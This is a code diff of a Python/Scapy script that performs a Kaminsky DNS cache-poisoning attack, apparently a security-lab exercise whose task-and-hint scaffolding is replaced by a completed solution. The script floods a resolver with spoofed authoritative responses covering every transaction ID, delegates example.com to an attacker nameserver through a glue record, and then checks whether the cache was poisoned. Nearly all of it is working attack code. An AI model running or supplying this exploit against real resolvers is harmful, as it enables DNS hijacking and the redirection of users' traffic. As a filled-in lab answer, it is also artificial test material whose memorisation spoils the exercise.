@@ -1,59 +1,44 @@
-from scapy.all import *
+import os
+import sys
 import struct
 import socket
 import random
 import string
 
-# ==========================================
-# TASK 1: Set your Attacker IP
-# ==========================================
-target_dns = "10.9.0.53"
-auth_dns = "10.9.0.154"      
-attacker_ip = "10.9.0.10" # <--- TASK 1: Replace with your machine's IP
-target_port = 33333
+CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
+PARENT_DIR = os.path.abspath(os.path.join(CURRENT_DIR, ".."))
+if PARENT_DIR not in sys.path:
+    sys.path.insert(0, PARENT_DIR)
 
-# ==========================================
-# TRIGGER QUERY FOR KAMINSKY ATTACK
-# ==========================================
+from scapy.all import *
+from common_library import *
+
+print("[*] 1. Leaking resolver TXID/port via controlled domain...")
+leaked_txid, target_port = sniff_port_and_txid(5)
+
+print("[*] 2. Generating random subdomain for cache evasion...")
 random_prefix = ''.join([random.choice(string.ascii_lowercase) for _ in range(5)])
 domain = "{}.example.com".format(random_prefix)
 
-print("[*] Sending trigger query for {}...".format(domain))
-trigger = IP(dst=target_dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
+print("[*] 3. Sending trigger query for {}...".format(domain))
+trigger = build_spoofed_dns_request(attacker_ip, 12345, 53, domain, "A")
 send(trigger, verbose=0)
 
-# ==========================================
-# TASK 2 & 3: Build the spoofed packet
-# ==========================================
-print("[*] Building and flooding spoofed KAMINSKY responses...")
-
+print("[*] 4. Building the spoofed Kaminsky responses...")
 base_pkt = (
     Ether(dst="ff:ff:ff:ff:ff:ff") /
-    IP(src=auth_dns, dst=target_dns) /
+    IP(src=example_auth_dns, dst=target_dns) /
     UDP(sport=53, dport=target_port, chksum=0) /
-    DNS(
-        id=0,
-        qr=1,
-        aa=1,
+    DNS(id=0, qr=1, aa=1, 
         qd=DNSQR(qname=domain),
-        an=DNSRR(rrname=domain, type='A', ttl=86400, rdata="1.1.1.1"),
+        # ANSWER: Legitimate-looking response for the random subdomain
+        an=DNSRR(rrname=domain, type='A', ttl=86400, rdata=fake_ip),
         
-        # <--- TASK 2: Claim control of the ENTIRE parent zone
-        # HINT 1: You want to hijack 'example.com', not the random subdomain.
-        # HINT 2: What is the record type for an Authority Server?
-        ns=DNSRR(rrname="example.com", 
-                 type='NS', 
-                 ttl=86400, 
-                 rdata="ns.attacker.com"
-                 ),
+        # AUTHORITY: Delegate the entire "example.com" zone to our nameserver
+        ns=DNSRR(rrname="example.com", type='NS', ttl=86400, rdata="ns.attacker.com"),
         
-        # <--- TASK 3: Map the fake NS to your IP (Glue Record)
-        # HINT: What is the record type that maps a name to an IPv4 address?
-        ar=DNSRR(rrname="ns.attacker.com", 
-                 type='A', 
-                 ttl=86400, 
-                 rdata=attacker_ip
-        )
+        # ADDITIONAL: Glue record mapping "ns.attacker.com" to our malicious IP
+        ar=DNSRR(rrname="ns.attacker.com", type='A', ttl=86400, rdata=attacker_auth_dns)
     )
 )
 
@@ -61,12 +46,8 @@ raw_bytes = bytearray(raw(base_pkt))
 s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
 s.bind(("eth0", 0))
 
-# ==========================================
-# TASK 4: The flood and the time window
-# ==========================================
-# <--- TASK 4: How many packets to cover all possible Transaction IDs? 
-# HINT: The DNS TXID is a 16-bit field. What is the maximum value?
-MAX_TXID = 2**16
+print("[*] 5. Flooding spoofed responses across all TXIDs on port {}...".format(target_port))
+MAX_TXID = 65536 
 
 for txid in range(0, MAX_TXID):
     struct.pack_into('!H', raw_bytes, 42, txid)
@@ -74,18 +55,12 @@ for txid in range(0, MAX_TXID):
 
 print("[+] Kaminsky flood complete for {}!".format(domain))
 
-# ==========================================
-# TASK 5: Run and Verify
-# ==========================================
-print("[*] Verifying cache poisoning...")
-verification = sr1(
-    IP(dst=target_dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain)),
-    timeout=3,
-    verbose=0
-)
+print("[*] 6. Verifying cache poisoning...")
+verification = build_spoofed_dns_request(attacker_ip, 12345, 53, domain, "A")
+ans = sr1(verification, timeout=3, verbose=0)
 
-if verification and verification.haslayer(DNS) and verification.an and verification.an.rdata == "1.1.1.1":
-    print("[+] Verification SUCCESS: {} resolves to 1.1.1.1".format(domain))
-    print("[!] ROOT CONQUERED! The attacker is now the authority for example.com.")
+if ans and ans.haslayer(DNS) and ans[DNS].an:
+    print("[+] Verification SUCCESS! {} resolves to {}".format(domain, ans[DNS].an.rdata))
+    print("[+] Check the real authority with: dig @{} example.com NS".format(target_dns))
 else:
-    print("[-] Verification FAILED: {} did not resolve to the fake IP".format(domain))
+    print("[-] Verification FAILED or timed out.")
